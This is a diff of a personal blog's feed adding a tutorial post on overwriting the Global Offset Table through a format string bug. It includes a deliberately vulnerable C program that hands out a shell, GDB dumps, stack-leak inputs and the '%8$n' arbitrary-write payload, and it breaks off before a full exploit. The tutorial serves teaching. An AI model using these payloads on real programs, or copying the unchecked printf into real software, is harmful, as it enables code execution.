@@ -1,4 +1,299 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-12-30T13:19:23-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Nihaal Prasad</title><subtitle></subtitle><entry><title type="html">Creating a Basic Heap Allocator</title><link href="http://localhost:4000/2020/12/30/creating-a-basic-heap-allocator.html" rel="alternate" type="text/html" title="Creating a Basic Heap Allocator" /><published>2020-12-30T00:00:00-05:00</published><updated>2020-12-30T00:00:00-05:00</updated><id>http://localhost:4000/2020/12/30/creating-a-basic-heap-allocator</id><content type="html" xml:base="http://localhost:4000/2020/12/30/creating-a-basic-heap-allocator.html">&lt;p&gt;The heap is an important segment of memory that grows upwards, towards the stack. This section of memory is used by computers to dynamically allocate memory to store whatever data they need for their programs to work. Heap allocators are used by programs in order to allot and keep track of chunks of memory that are being used inside of the heap. Modern operating systems use efficient and effective heap allocators in their systems, but this blog post will just be going over how a very basic heap allocator can be constructed in C.&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-01-03T14:15:30-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Nihaal Prasad</title><subtitle></subtitle><entry><title type="html">GOT Overwrite Using Format Strings</title><link href="http://localhost:4000/2021/01/03/got-overwrite-using-format-strings.html" rel="alternate" type="text/html" title="GOT Overwrite Using Format Strings" /><published>2021-01-03T00:00:00-05:00</published><updated>2021-01-03T00:00:00-05:00</updated><id>http://localhost:4000/2021/01/03/got-overwrite-using-format-strings</id><content type="html" xml:base="http://localhost:4000/2021/01/03/got-overwrite-using-format-strings.html">&lt;p&gt;The Global Offset Table (GOT) is a table of memory addresses, and the location of the GOT is always known at runtime. Typically, the GOT is used to store the address of various functions in libraries that are loaded into the program. Because of PIE, libraries will be relocated at runtime, so the only way for a running process to know the location of a certain library function is by looking it up inside of the GOT.&lt;/p&gt;
+
+&lt;p&gt;The Procedure Linkage Table (PLT) contains entries for every external library function in the program. The PLT entry for a function contains some executable code that essentially looks up the address of the function inside of the GOT and jumps to that address. If this is the first time that the function has been called, then the GOT entry will simply point to some code that will figure out the real address of the function. The second time that the function gets called, the GOT entry should point to the real address of the function. This can be summed up in the following steps:&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;The program wants to call some function &lt;code class=&quot;highlighter-rouge&quot;&gt;x()&lt;/code&gt;, which is located in an external library.&lt;/li&gt;
+  &lt;li&gt;The program first jumps to &lt;code class=&quot;highlighter-rouge&quot;&gt;x@plt&lt;/code&gt;, which is the PLT entry for &lt;code class=&quot;highlighter-rouge&quot;&gt;x()&lt;/code&gt;.&lt;/li&gt;
+  &lt;li&gt;The code at &lt;code class=&quot;highlighter-rouge&quot;&gt;x@plt&lt;/code&gt; jumps to the function pointer stored at the GOT entry for &lt;code class=&quot;highlighter-rouge&quot;&gt;x()&lt;/code&gt;. The GOT entry for &lt;code class=&quot;highlighter-rouge&quot;&gt;x()&lt;/code&gt; is written as &lt;code class=&quot;highlighter-rouge&quot;&gt;x@got.plt&lt;/code&gt;.&lt;/li&gt;
+  &lt;li&gt;If this is the first time that &lt;code class=&quot;highlighter-rouge&quot;&gt;x()&lt;/code&gt; has been called:
+    &lt;ul&gt;
+      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;x@got.plt&lt;/code&gt; will simply jump to the line of code that comes right after &lt;code class=&quot;highlighter-rouge&quot;&gt;x@plt&lt;/code&gt;.&lt;/li&gt;
+      &lt;li&gt;The code that comes right after &lt;code class=&quot;highlighter-rouge&quot;&gt;x@plt&lt;/code&gt; will call a function that will figure out the actual address of &lt;code class=&quot;highlighter-rouge&quot;&gt;x()&lt;/code&gt;.&lt;/li&gt;
+      &lt;li&gt;After the address is found, &lt;code class=&quot;highlighter-rouge&quot;&gt;x@got.plt&lt;/code&gt; will be replaced with a pointer to the address of &lt;code class=&quot;highlighter-rouge&quot;&gt;x()&lt;/code&gt;.&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Below is an example of how this looks like in assembly. This example was copied straight from a program opened up in GDB, and it is paused right before it makes a call to the &lt;code class=&quot;highlighter-rouge&quot;&gt;exit()&lt;/code&gt; function.&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x5655628d &amp;lt;main+153&amp;gt;       call   0x56556060 &amp;lt;exit@plt&amp;gt;
+   ↳  0x56556060 &amp;lt;exit@plt+0&amp;gt;     jmp    DWORD PTR [ebx+0x18]
+      0x56556066 &amp;lt;exit@plt+6&amp;gt;     push   0x18
+      0x5655606b &amp;lt;exit@plt+11&amp;gt;    jmp    0x56556020
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;In this example, &lt;code class=&quot;highlighter-rouge&quot;&gt;RIP&lt;/code&gt; is currently pointing to &lt;code class=&quot;highlighter-rouge&quot;&gt;0x5655628d&lt;/code&gt;. The function wants to call &lt;code class=&quot;highlighter-rouge&quot;&gt;exit()&lt;/code&gt;, and in order to do this, the function will make a jump to &lt;code class=&quot;highlighter-rouge&quot;&gt;exit@plt&lt;/code&gt;, which is &lt;code class=&quot;highlighter-rouge&quot;&gt;0x56556060&lt;/code&gt; in this example. &lt;code class=&quot;highlighter-rouge&quot;&gt;ebx+0x18&lt;/code&gt; currently points to &lt;code class=&quot;highlighter-rouge&quot;&gt;x@got.plt&lt;/code&gt;, so the code at &lt;code class=&quot;highlighter-rouge&quot;&gt;exit@plt+0&lt;/code&gt; will dereference the function pointer at &lt;code class=&quot;highlighter-rouge&quot;&gt;x@got.plt&lt;/code&gt; and jump to it.&lt;/p&gt;
+
+&lt;p&gt;The first time that &lt;code class=&quot;highlighter-rouge&quot;&gt;exit()&lt;/code&gt; is called, &lt;code class=&quot;highlighter-rouge&quot;&gt;x@got.plt&lt;/code&gt; will be equal to &lt;code class=&quot;highlighter-rouge&quot;&gt;exit@plt+6&lt;/code&gt;. In order to dynamically resolve the address of &lt;code class=&quot;highlighter-rouge&quot;&gt;exit()&lt;/code&gt;, the code will jump to &lt;code class=&quot;highlighter-rouge&quot;&gt;0x56556020&lt;/code&gt;, which contains code that will figure out the correct address of &lt;code class=&quot;highlighter-rouge&quot;&gt;exit()&lt;/code&gt;. Technically, &lt;code class=&quot;highlighter-rouge&quot;&gt;exit()&lt;/code&gt; can only be called once because it stops the program, but if it was possible to call &lt;code class=&quot;highlighter-rouge&quot;&gt;exit()&lt;/code&gt; a second time, then the jump at &lt;code class=&quot;highlighter-rouge&quot;&gt;exit@plt+0&lt;/code&gt; would directly jump to the address of &lt;code class=&quot;highlighter-rouge&quot;&gt;exit()&lt;/code&gt; because it would have already resolved the address beforehand.&lt;/p&gt;
+
+&lt;p&gt;If an attacker is able to modify the GOT entry for some function &lt;code class=&quot;highlighter-rouge&quot;&gt;x()&lt;/code&gt;, the attacker can replace the function pointer at &lt;code class=&quot;highlighter-rouge&quot;&gt;x@got.plt&lt;/code&gt; with a pointer to some malicious code. After the attacker has hijacked the GOT entry, the attacker’s malicious code will be executed instead of &lt;code class=&quot;highlighter-rouge&quot;&gt;x()&lt;/code&gt; whenever the process calls &lt;code class=&quot;highlighter-rouge&quot;&gt;x()&lt;/code&gt;. This happens because the process will always lookup the function pointer for &lt;code class=&quot;highlighter-rouge&quot;&gt;x()&lt;/code&gt; using &lt;code class=&quot;highlighter-rouge&quot;&gt;x@got.plt&lt;/code&gt; even if the GOT entry has been modified.&lt;/p&gt;
+
+&lt;p&gt;Relocation Read-Only (RELRO) is an exploit mitigation technology that marks some sections of a binary as read-only. Nearly all executables have partial RELRO enabled, which will cause the GOT to come before the BSS section in memory. This mitigates against buffer overflows on GOT entries, but it still makes it possible to modify the GOT entry if the attacker can write to arbitrary memory. Full RELRO will make the program resolve all symbols at startup, and afterwards, it marks the GOT as read-only. As a result, full RELRO completely mitigates against all GOT overwrite vulnerabilities. However, full RELRO is not used as often in programs because it delays a program’s startup time.&lt;/p&gt;
+
+&lt;p&gt;The below program contains a format string vulnerability. In normal circumstances, an attacker could use the format string vulnerability to overwrite the return value and jump to the &lt;code class=&quot;highlighter-rouge&quot;&gt;win()&lt;/code&gt; function. However, in this example, the program calls &lt;code class=&quot;highlighter-rouge&quot;&gt;exit()&lt;/code&gt; before it stops, and this means that even if an attacker overwrites the return value, the program will stop before it executes the &lt;code class=&quot;highlighter-rouge&quot;&gt;ret&lt;/code&gt; instruction at the end of the function.&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;stdlib.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;// Compilation: gcc -o got -m32 got.c&lt;/span&gt;
+
+&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;win&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;50&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strncmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;quit&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strncmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;q&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;fgets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;50&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stdin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Instead of overwriting the return address, the attacker could overwrite the GOT entry for &lt;code class=&quot;highlighter-rouge&quot;&gt;exit()&lt;/code&gt; using a format string vulnerability. If the GOT entry for &lt;code class=&quot;highlighter-rouge&quot;&gt;exit()&lt;/code&gt; gets overwritten with the address of &lt;code class=&quot;highlighter-rouge&quot;&gt;win()&lt;/code&gt;, then whenever &lt;code class=&quot;highlighter-rouge&quot;&gt;exit()&lt;/code&gt; gets called, the program would jump to the &lt;code class=&quot;highlighter-rouge&quot;&gt;win()&lt;/code&gt; function instead, giving the attacker a shell.&lt;/p&gt;
+
+&lt;p&gt;Here is what the main function looks like in assembly:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gef➤  disas main
+Dump of assembler code for function main:
+   0x565561f4 &amp;lt;+0&amp;gt;:     lea    ecx,[esp+0x4]
+   0x565561f8 &amp;lt;+4&amp;gt;:     and    esp,0xfffffff0
+   0x565561fb &amp;lt;+7&amp;gt;:     push   DWORD PTR [ecx-0x4]
+   0x565561fe &amp;lt;+10&amp;gt;:    push   ebp
+   0x565561ff &amp;lt;+11&amp;gt;:    mov    ebp,esp
+   0x56556201 &amp;lt;+13&amp;gt;:    push   edi
+   0x56556202 &amp;lt;+14&amp;gt;:    push   esi
+   0x56556203 &amp;lt;+15&amp;gt;:    push   ebx
+   0x56556204 &amp;lt;+16&amp;gt;:    push   ecx
+   0x56556205 &amp;lt;+17&amp;gt;:    sub    esp,0x48
+   0x56556208 &amp;lt;+20&amp;gt;:    call   0x565560d0 &amp;lt;__x86.get_pc_thunk.bx&amp;gt;
+   0x5655620d &amp;lt;+25&amp;gt;:    add    ebx,0x2df3
+   0x56556213 &amp;lt;+31&amp;gt;:    jmp    0x5655623e &amp;lt;main+74&amp;gt;
+   0x56556215 &amp;lt;+33&amp;gt;:    mov    eax,DWORD PTR [ebx-0xc]
+   0x5655621b &amp;lt;+39&amp;gt;:    mov    eax,DWORD PTR [eax]
+   0x5655621d &amp;lt;+41&amp;gt;:    sub    esp,0x4
+   0x56556220 &amp;lt;+44&amp;gt;:    push   eax
+   0x56556221 &amp;lt;+45&amp;gt;:    push   0x32
+   0x56556223 &amp;lt;+47&amp;gt;:    lea    eax,[ebp-0x4a]
+   0x56556226 &amp;lt;+50&amp;gt;:    push   eax
+   0x56556227 &amp;lt;+51&amp;gt;:    call   0x56556040 &amp;lt;fgets@plt&amp;gt;
+   0x5655622c &amp;lt;+56&amp;gt;:    add    esp,0x10
+   0x5655622f &amp;lt;+59&amp;gt;:    sub    esp,0xc
+   0x56556232 &amp;lt;+62&amp;gt;:    lea    eax,[ebp-0x4a]
+   0x56556235 &amp;lt;+65&amp;gt;:    push   eax
+   0x56556236 &amp;lt;+66&amp;gt;:    call   0x56556030 &amp;lt;printf@plt&amp;gt;
+   0x5655623b &amp;lt;+71&amp;gt;:    add    esp,0x10
+   0x5655623e &amp;lt;+74&amp;gt;:    lea    eax,[ebp-0x4a]
+   0x56556241 &amp;lt;+77&amp;gt;:    mov    edx,eax
+   0x56556243 &amp;lt;+79&amp;gt;:    lea    eax,[ebx-0x1ff0]
+   0x56556249 &amp;lt;+85&amp;gt;:    mov    ecx,0x6
+   0x5655624e &amp;lt;+90&amp;gt;:    mov    esi,edx
+   0x56556250 &amp;lt;+92&amp;gt;:    mov    edi,eax
+   0x56556252 &amp;lt;+94&amp;gt;:    repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
+   0x56556254 &amp;lt;+96&amp;gt;:    seta   al
+   0x56556257 &amp;lt;+99&amp;gt;:    setb   dl
+   0x5655625a &amp;lt;+102&amp;gt;:   sub    eax,edx
+   0x5655625c &amp;lt;+104&amp;gt;:   movsx  eax,al
+   0x5655625f &amp;lt;+107&amp;gt;:   test   eax,eax
+   0x56556261 &amp;lt;+109&amp;gt;:   je     0x56556288 &amp;lt;main+148&amp;gt;
+   0x56556263 &amp;lt;+111&amp;gt;:   lea    eax,[ebp-0x4a]
+   0x56556266 &amp;lt;+114&amp;gt;:   mov    edx,eax
+   0x56556268 &amp;lt;+116&amp;gt;:   lea    eax,[ebx-0x1fea]
+   0x5655626e &amp;lt;+122&amp;gt;:   mov    ecx,0x3
+   0x56556273 &amp;lt;+127&amp;gt;:   mov    esi,edx
+   0x56556275 &amp;lt;+129&amp;gt;:   mov    edi,eax
+   0x56556277 &amp;lt;+131&amp;gt;:   repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
+   0x56556279 &amp;lt;+133&amp;gt;:   seta   al
+   0x5655627c &amp;lt;+136&amp;gt;:   setb   dl
+   0x5655627f &amp;lt;+139&amp;gt;:   sub    eax,edx
+   0x56556281 &amp;lt;+141&amp;gt;:   movsx  eax,al
+   0x56556284 &amp;lt;+144&amp;gt;:   test   eax,eax
+   0x56556286 &amp;lt;+146&amp;gt;:   jne    0x56556215 &amp;lt;main+33&amp;gt;
+   0x56556288 &amp;lt;+148&amp;gt;:   sub    esp,0xc
+   0x5655628b &amp;lt;+151&amp;gt;:   push   0x0
+=&amp;gt; 0x5655628d &amp;lt;+153&amp;gt;:   call   0x56556060 &amp;lt;exit@plt&amp;gt;
+End of assembler dump.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;To do this attack, an attacker needs to first leak an address off of the stack and calculate the address of the GOT entry from the leaked address. To find the address of the GOT entry, set a breakpoint at &lt;code class=&quot;highlighter-rouge&quot;&gt;main+153&lt;/code&gt;, right before the jump to &lt;code class=&quot;highlighter-rouge&quot;&gt;exit@plt&lt;/code&gt; so that the value of the GOT entry can be recorded right before exiting. Next, continue execution and leak a few pointers off of the stack, then type “quit” to stop.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gef➤  c
+Continuing.
+%p.%p.%p.%p.%p.%p.%p.%p.
+0x32.0xf7fb1580.0x5655620d.0x56555034.(nil).0xf7ffd000.0x70250000.0x2e70252e.
+quit
+quit
+
+Breakpoint 5, 0x5655628d in main ()
+[ Legend: Modified register | Code | Heap | Stack | String ]
+────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
+$eax   : 0x0
+$ebx   : 0x56559000  →  0x00003ef8
+$ecx   : 0x0
+$edx   : 0xffffd100  →  0x00000001
+$esp   : 0xffffd170  →  0x00000000
+$ebp   : 0xffffd1d8  →  0x00000000
+$esi   : 0xffffd194  →  &quot;%p.%p.%p.%p.%p.%p.\n&quot;
+$edi   : 0x56557016  →  0x00000a71 (&quot;q\n&quot;?)
+$eip   : 0x5655628d  →  &amp;lt;main+153&amp;gt; call 0x56556060 &amp;lt;exit@plt&amp;gt;
+$eflags: [zero carry PARITY ADJUST SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
+$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
+────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0xffffd170│+0x0000: 0x00000000   ← $esp
+0xffffd174│+0x0004: 0x00000032 (&quot;2&quot;?)
+0xffffd178│+0x0008: 0xf7fb1580  →  0xfbad2288
+0xffffd17c│+0x000c: 0x5655620d  →  &amp;lt;main+25&amp;gt; add ebx, 0x2df3
+0xffffd180│+0x0010: 0x56555034  →  0x00000006
+0xffffd184│+0x0014: 0x00000000
+0xffffd188│+0x0018: 0xf7ffd000  →  0x00029f3c
+0xffffd18c│+0x001c: 0x75710000
+──────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
+   0x56556280 &amp;lt;main+140&amp;gt;       ror    BYTE PTR [edi], 1
+   0x56556282 &amp;lt;main+142&amp;gt;       mov    esi, 0x75c085c0
+   0x56556287 &amp;lt;main+147&amp;gt;       lea    eax, [ebx+0x6a0cec]
+ → 0x5655628d &amp;lt;main+153&amp;gt;       call   0x56556060 &amp;lt;exit@plt&amp;gt;
+   ↳  0x56556060 &amp;lt;exit@plt+0&amp;gt;     jmp    DWORD PTR [ebx+0x18]
+      0x56556066 &amp;lt;exit@plt+6&amp;gt;     push   0x18
+      0x5655606b &amp;lt;exit@plt+11&amp;gt;    jmp    0x56556020
+      0x56556070 &amp;lt;__libc_start_main@plt+0&amp;gt; jmp    DWORD PTR [ebx+0x1c]
+      0x56556076 &amp;lt;__libc_start_main@plt+6&amp;gt; push   0x20
+      0x5655607b &amp;lt;__libc_start_main@plt+11&amp;gt; jmp    0x56556020
+──────────────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
+exit@plt (
+   [sp + 0x0] = 0x00000000
+)
+──────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: &quot;got&quot;, stopped 0x5655628d in main (), reason: BREAKPOINT
+────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
+[#0] 0x5655628d → main()
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The GOT entry is clearly at &lt;code class=&quot;highlighter-rouge&quot;&gt;ebx+0x18&lt;/code&gt; because that is where the first &lt;code class=&quot;highlighter-rouge&quot;&gt;jmp&lt;/code&gt; instruction jumps to inside of &lt;code class=&quot;highlighter-rouge&quot;&gt;exit@plt&lt;/code&gt;. Printing this out gives an address of &lt;code class=&quot;highlighter-rouge&quot;&gt;0x56559018&lt;/code&gt;. Note that ASLR is enabled, so the address may change in another instance of the process.&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gef➤  x/2w $ebx+0x18
+0x56559018 &amp;lt;exit@got.plt&amp;gt;:      0x56556066      0xf7dead40
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The third value that was leaked off of the stack was &lt;code class=&quot;highlighter-rouge&quot;&gt;0x5655620d&lt;/code&gt;, which seems close to the address of &lt;code class=&quot;highlighter-rouge&quot;&gt;exit@got.plt&lt;/code&gt;. The difference between the third address leaked off of the stack and the address of &lt;code class=&quot;highlighter-rouge&quot;&gt;exit@got.plt&lt;/code&gt; can be found using python.&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ python3
+Python 3.8.6 (default, Sep 25 2020, 09:36:53)
+[GCC 10.2.0] on linux
+Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.
+&amp;gt;&amp;gt;&amp;gt; hex(0x5655620d - 0x56559018)
+'-0x2e0b'
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This means that adding &lt;code class=&quot;highlighter-rouge&quot;&gt;0x2e0b&lt;/code&gt; to the third address leaked off of the stack will give the attacker the address of &lt;code class=&quot;highlighter-rouge&quot;&gt;exit@got.plt&lt;/code&gt;. The attacker can use the same trick to calculate the address of &lt;code class=&quot;highlighter-rouge&quot;&gt;win()&lt;/code&gt; using this leaked value.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gef➤  disas win
+Dump of assembler code for function win:
+   0x565561c9 &amp;lt;+0&amp;gt;:     push   ebp
+   0x565561ca &amp;lt;+1&amp;gt;:     mov    ebp,esp
+   0x565561cc &amp;lt;+3&amp;gt;:     push   ebx
+   0x565561cd &amp;lt;+4&amp;gt;:     sub    esp,0x4
+   0x565561d0 &amp;lt;+7&amp;gt;:     call   0x56556292 &amp;lt;__x86.get_pc_thunk.ax&amp;gt;
+   0x565561d5 &amp;lt;+12&amp;gt;:    add    eax,0x2e2b
+   0x565561da &amp;lt;+17&amp;gt;:    sub    esp,0xc
+   0x565561dd &amp;lt;+20&amp;gt;:    lea    edx,[eax-0x1ff8]
+   0x565561e3 &amp;lt;+26&amp;gt;:    push   edx
+   0x565561e4 &amp;lt;+27&amp;gt;:    mov    ebx,eax
+   0x565561e6 &amp;lt;+29&amp;gt;:    call   0x56556050 &amp;lt;system@plt&amp;gt;
+   0x565561eb &amp;lt;+34&amp;gt;:    add    esp,0x10
+   0x565561ee &amp;lt;+37&amp;gt;:    nop
+   0x565561ef &amp;lt;+38&amp;gt;:    mov    ebx,DWORD PTR [ebp-0x4]
+   0x565561f2 &amp;lt;+41&amp;gt;:    leave
+   0x565561f3 &amp;lt;+42&amp;gt;:    ret
+End of assembler dump.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;win()&lt;/code&gt; function is located at &lt;code class=&quot;highlighter-rouge&quot;&gt;0x565561c9&lt;/code&gt;, and python can again be used to find the offset of this address from the leaked address.&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ python3
+Python 3.8.6 (default, Sep 25 2020, 09:36:53)
+[GCC 10.2.0] on linux
+Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.
+&amp;gt;&amp;gt;&amp;gt; hex(0x5655620d - 0x565561c9)
+'0x44'
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;This means that subtracting &lt;code class=&quot;highlighter-rouge&quot;&gt;0x44&lt;/code&gt; from the third address leaked off of the stack will give the attacker the address of &lt;code class=&quot;highlighter-rouge&quot;&gt;win()&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;One thing to note is that the attacker has complete control over the eighth address on the stack. In the below example, the attacker modifies the eighth value on the stack to be B’s. Note that the eighth value on the stack is being used instead of the seventh value because the attack can only control two bytes of the seventh value on the stack.&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ./got                                                                                                  127 ⨯
+AABBBB%8$p
+AABBBB0x42424242
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;If the attacker modifies the input to be &lt;code class=&quot;highlighter-rouge&quot;&gt;AABBBB%8$n&lt;/code&gt;, the attacker can write an arbitrary number to the memory address &lt;code class=&quot;highlighter-rouge&quot;&gt;0x42424242&lt;/code&gt;. The attacker can write to arbitrary memory by replacing the B’s with a real memory address. In this exploit, the attacker will replace the B’s with the calculated GOT address, and the attacker will write two bytes at a time (meaning that the attacker needs to use the format string vulnerability twice to write out the entire four-byte pointer to &lt;code class=&quot;highlighter-rouge&quot;&gt;win()&lt;/code&gt; in the GOT entry).&lt;/p&gt;
+
